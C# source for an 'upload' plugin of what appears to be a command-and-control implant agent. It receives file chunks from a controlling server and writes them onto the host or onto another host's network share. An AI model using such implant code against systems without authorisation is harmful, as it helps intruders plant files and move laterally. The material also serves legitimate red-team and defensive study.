﻿using Agent.Interfaces;

using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;

namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "upload";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig config { get; set; }
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.tokenManager = tokenManager;
            this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            ServerUploadJob uploadJob = new ServerUploadJob(job, this.config.chunk_size);
            Dictionary<string, string> uploadParams = Misc.ConvertJsonStringToDict(job.task.parameters);
            uploadJob.path = uploadParams["remote_path"];
            if (uploadParams.ContainsKey("host") && !string.IsNullOrEmpty(uploadParams["host"]))
            {
                if (!uploadParams["remote_path"].Contains(":") && !uploadParams["remote_path"].StartsWith("\\\\")) //It's not a local path, and it's not already in UNC format
                {
                    uploadJob.path = @"\\" + uploadParams["host"] + @"\" + uploadParams["remote_path"];
                }
            }
            if (uploadParams.ContainsKey("chunk_size") && !string.IsNullOrEmpty(uploadParams["chunk_size"]))
            {
                try
                {
                    uploadJob.chunk_size = int.Parse(uploadParams["chunk_size"]);
                }
                catch { }
            }

            uploadJob.file_id = uploadParams["file"];
            uploadJob.task = job.task;
            uploadJob.chunk_num = 1;

            if (!CanWriteToFolder(uploadJob.path))
            {
                await messageManager.Write("Folder is not writeable", job.task.id, true, "error");
                return;
            }

            if (File.Exists(uploadJob.path))
            {
                await messageManager.Write("File already exists.", job.task.id, true, "error");
                return;
            }

            uploadJobs.GetOrAdd(job.task.id, uploadJob);

            await messageManager.AddResponse(new UploadResponse
            {
                task_id = job.task.id,
                upload = new UploadResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = uploadJob.path,
                }
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerResponseResult response)
        {
            ServerUploadJob uploadJob = this.GetJob(response.task_id);

            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                this.CompleteUploadJob(response.task_id);
            }

            if (uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await messageManager.AddResponse(new ResponseResult
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x12" } },

                }.ToJson());
                return;
            }

            if(!await this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
            {
                this.CompleteUploadJob(response.task_id);
                return;
            }

            uploadJob.chunk_num++;

            UploadResponse ur = new UploadResponse()
            {
                task_id = response.task_id,
                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
                upload = new UploadResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                this.CompleteUploadJob(response.task_id);
            }
            await messageManager.AddResponse(ur.ToJson());
        }

        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        private void CompleteUploadJob(string task_id)
        {
            if (uploadJobs.ContainsKey(task_id))
            {
                uploadJobs.Remove(task_id, out _);
            }
            this.messageManager.CompleteJob(task_id);
        }

        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<bool> HandleNextChunk(byte[] bytes, string job_id)
        {
            ServerUploadJob job = uploadJobs[job_id];
            try
            {
                await Misc.AppendAllBytes(job.path, bytes);
                return true;
            }
            catch (Exception e)
            {
                await this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
                return false;
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        private ServerUploadJob GetJob(string task_id)
        {
            return uploadJobs[task_id];
        }

        private bool CanWriteToFolder(string folderPath)
        {
            try
            {
                var directory = Path.GetDirectoryName(folderPath);
                // Check if the folder exists
                if (Directory.Exists(directory))
                {
                    Console.WriteLine("Directory Exists.");
                    // Try to create a temporary file in the folder
                    string tempFilePath = Path.Combine(directory, Path.GetRandomFileName());
                    using (FileStream fs = File.Create(tempFilePath)) { }

                    // If successful, delete the temporary file
                    File.Delete(tempFilePath);

                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ep)
            {
                Console.WriteLine(ep);
                // An exception occurred, indicating that writing to the folder is not possible
                return false;
            }
        }


    }
}